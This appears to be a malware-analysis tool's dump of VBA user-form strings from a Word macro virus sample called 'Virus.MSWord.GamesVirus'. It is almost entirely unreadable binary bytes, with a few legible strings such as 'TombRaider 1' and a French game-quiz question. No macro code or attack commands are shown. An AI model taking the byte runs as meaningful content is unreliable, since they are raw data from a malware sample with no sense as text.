VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 SZi8BaJRa9JYBRYAJI8BQAJQ8BQ79Y61a.1i&1i%)a%)Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a$!a.1i%)a%)i.1i&1i%)i%)i&1i&1i%)a%)a&1i%)a%)i%)a%)a&1i&1a%)a%)i%)a&1i%)i#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.1i$! $!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)i61A%)i%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.1i&1i.1i%)a%)a%)a-)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Yĥaĥaĥaĥaĥa3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)INs�+Zq*Rq!Jq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BaQ��O{�Ek�a��`��W{�{��<cyFs�(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BQ BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A'9I'9Q)Ja0BQ1JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(BQ2Ri3Zi2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I(BY:RaCZa1Ja'9I1JQ:RY0BA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
09Ja1Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A'9Q79Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(Bi BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A&1Y	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a%)i.1iAJyAJq79i8Bq%)i%)i.1i%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! Tci79Y8BYIJi8BA798AJQ8BIAJQ8BI.1Y%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)a$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a%)a&1i%)a%)i%)i&1i%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)i&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a.1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a.1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a-)Y%)i%)Y-)a%)i&1i%)i&1i&1i&1i%)i%)Y%)a%)Y%)a%)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!a��Y��Yĥa��Y��Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY!JiEky+Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba!Jq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bi*RqX��G{�Ek�b��a��;Zq2Ra1Ja'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ja;Za2Ri'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
18'9A(BQ3ZiMkyDcy4cq3Zq:Ri;ZiMki2Ra*RY(BY*RY(BY)JQ(BI(BI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�TombRaider 1�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�TombRaider 2�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�De quel jeu est tir� cette image ?O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<::<:<9:::<<:::<::<::::<<9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:<999999999�9999:��������������������������������������:����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�::�����::�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�����������������������������������������������������������������������������ý�������������������oooz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
zo������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
999999<�99<9999999<9999999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������ܶ���������������������:����::::������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:����:����������������������������������������������������:��<�������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
oooo�������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9��9<999999999<99999<99��9:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������:����:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:::�����::��:����::����������������������������������������������:�������������������������������������������:oo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:oo�������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R9�<999<<999<:9::999�0999�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�999�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9������������������������������������������::�:�����::�:::������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o:o���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q9<99B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�99FF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:9FHQB�<99�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9������������������������������������:�����::�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::o����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�C9999R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<K<BJ:<B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:NI999�9F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F��X�D9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�����������������������������������:�����:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:����:���::����::����������������������������������������������������������������Í�oo��������������������o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J<99<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<I9�9R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������ܽ:�����:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����::�::�����:��������������������������������������������������������������������<��������������������::oo:�������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K<9�B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9<�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�TF<<999�F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ý<������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:��������:������������������������������������������������������������������������������ý�����������������zzz:�޶�î��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F9��T�R999�9�999<�99
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������������::����������:�����::����������������������������������������������������������������������Ó�Þ�Ñ������������oz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I<�99
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H9<9<99999�999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H<99�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S9MIM��K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������������:�����������:����:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�������������������������������������������������������������������������������������������ooo��������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F<<999999�999999<99�<<<9�9<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IIKA�OAF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9���<������������������������������������:����������:�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:����������������������������������������������������������������������������������Ñ������ooo�����������������������������ޓ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I99:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<9:<::�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9<::<�999JJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�TGBM�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������:����:�����������:�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:������������������������������������������������������������ܽ��������������ýý�����������ooo����������������������������޶���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�:9�:<FII9�<9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<<<�9JF<�E���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
HKKFKDH9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������:����������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����:���������������������������������������������������������������Õ����������������������񑎎�oo�����������������������������듓��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9F�:9F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������:���������������:�����:��������������������������������������������������������������Ó����������������ý�Ñ���ý��<��ö�Þ���������������������ړ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F9�:9I:<<9F�K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9F�JE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������:����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����:�����������������������������������������������������������������Õ���������������å����������������򫡡������������������ꓓ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I<9F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9N<9I99F9�99<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9:�JPS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99�����������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
